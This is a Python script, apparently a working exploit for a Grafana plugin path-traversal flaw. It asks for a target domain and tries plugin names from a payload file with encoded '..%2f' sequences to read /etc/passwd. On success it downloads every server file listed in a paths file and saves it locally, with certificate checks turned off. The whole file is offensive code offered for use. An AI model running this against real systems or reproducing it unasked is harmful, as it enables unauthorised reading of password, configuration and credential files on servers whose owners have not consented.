import os
import requests
from termcolor import colored

if __name__ == "__main__":

    print("-----------------------------------------------------------------------------------------------------------")
    print(colored("Grafana Exploit by Zakaria & Aymen", 'blue'))
    print("-----------------------------------------------------------------------------------------------------------")
    target_domain = input("Enter the domain of the target : ")

    # Open paths and payload list file
    payloads = open('payload.txt', 'r', encoding='utf-8').readlines()
    paths = open('paths.txt', 'r', encoding='utf-8').readlines()

    vuln_payload = None

    out_path = "outputs"

    print(f'\n{"=" * 40}\n')

    print(colored(f"[i] Target: {target_domain}\n", "blue"))

    for payload in payloads:

        url = f"{target_domain}/public/plugins/{payload.strip()}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
        req = requests.get(url, timeout=(3, 10), allow_redirects=False, verify=False)

        if req.status_code == 200:

            print(colored(f"[!] Payload \"{url.strip()}\" works.\n", "green"))
            vuln_payload = payload.strip()  # Set as vulnerable

        else:
            print(colored(f"[!] Payload \"{url.strip()}\" not works.\n", "red"))

    if vuln_payload is not None:
        print(colored(f"[i] Analysing files...\n", "blue"))

        found = {}

        for path in paths:
            path = path.strip()
            url = f"{target_domain}/public/plugins/{vuln_payload}{path}"

            req = requests.get(url, timeout=(3, 10), allow_redirects=False, verify=False)

            if req.status_code == 200:
                print(colored(f"[i] File \"/{path.split('%2f')[-1]}\" found in server.", "red"))
                out_file = os.path.join('.', out_path, path.split('/')[-1])

                found[(path.split('/')[-1])] = out_file

                with open(out_file, 'wb+') as fd:
                    fd.write(req.content)

                print(colored(f"      [*] File saved in \"{out_file}\".\n", "green"))
